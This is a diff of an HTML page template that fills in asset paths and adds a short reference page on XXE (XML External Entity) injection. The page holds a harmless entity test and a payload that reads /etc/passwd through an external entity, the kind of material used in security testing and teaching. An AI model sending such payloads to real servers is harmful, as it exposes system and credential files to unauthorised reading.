@@ -6,13 +6,13 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
-    <link rel="apple-touch-icon" sizes="180x180" href="%s">
-    <link rel="icon" type="image/png" sizes="32x32" href="%s">
-    <link rel="icon" type="image/png" sizes="16x16" href="%s">
-    <link rel="manifest" href="%s">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../../favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../../favicon-16x16.png">
+    <link rel="manifest" href="../../site.webmanifest">
     <link rel="stylesheet"
           href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/github.min.css">
-    <link rel="stylesheet" type="text/css" href="%s">
+    <link rel="stylesheet" type="text/css" href="../../style.css">
     <style>
         pre {
             position: relative;
@@ -53,9 +53,27 @@
 </head>
 <body>
 <div class="wrapper">
-    %s
+    <h1 id="xxe-injection-xml-external-entity">XXE Injection (XML External Entity)</h1>
+
+<h2 id="testing-for-xxe">Testing for XXE</h2>
+
+<pre><code class="language-xml">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY example &quot;Cappucino&quot;&gt; ]&gt;
+ &lt;userInfo&gt;
+  &lt;firstName&gt;John&lt;/firstName&gt;
+  &lt;lastName&gt;&amp;example;&lt;/lastName&gt;
+ &lt;/userInfo&gt;
+</code></pre>
+
+<h2 id="retrieve-local-server-file">Retrieve local server file</h2>
+
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;
+&lt;root&gt;&amp;test;&lt;/root&gt;
+</code></pre>
+
     <hr>
-    <a href="%s" class="back-link">
+    <a href="../../index.html" class="back-link">
         <svg xmlns="http://www.w3.org/2000/svg"
              class="icon"
              fill="none"
